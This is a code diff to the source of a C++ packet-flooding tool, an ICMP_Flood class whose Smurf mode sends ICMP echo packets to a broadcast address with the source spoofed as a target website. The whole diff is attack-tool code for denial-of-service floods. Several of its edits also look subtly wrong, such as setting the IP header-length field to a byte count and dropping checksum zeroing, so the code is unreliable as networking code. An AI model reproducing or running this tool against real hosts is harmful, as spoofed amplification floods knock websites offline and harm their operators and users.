@@ -81,7 +81,7 @@ void ICMP_Flood::override_headers(icmphdr *icmp, iphdr *ip){
             break;
         case Config::Smurf:
             icmp->type = ICMP_ECHO;
-            icmp->type = ICMP_NET_UNREACH;
+            icmp->code = ICMP_NET_UNREACH;
             ip->daddr = inet_addr(conf->broadcast.c_str());
             ip->saddr = inet_addr(conf->website.c_str());
         default:break;
@@ -92,20 +92,17 @@ void ICMP_Flood::override_headers(icmphdr *icmp, iphdr *ip){
 void ICMP_Flood::init_headers(iphdr *ip, icmphdr *icmp, char *buf) {
     // IP Struct
     ip->version = 4;
-    ip->ihl = 5;
+    ip->ihl = sizeof(struct iphdr) + sizeof(struct icmphdr) + strlen(buf);
     ip->tos = 0;
-    ip->tot_len = htons(sizeof(buf));
+    ip->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + strlen(buf);
     ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
     ip->frag_off = htons(0x0);
     ip->ttl = 255;
     ip->protocol = IPPROTO_ICMP;
-    ip->check = 0;
-
     ip->check = csum((unsigned short *) buf, ip->tot_len);
 
     icmp->type = 0;
     icmp->code = 0;
     icmp->un.echo.sequence = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
     icmp->un.echo.id = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
-    icmp->checksum = 0;
 }
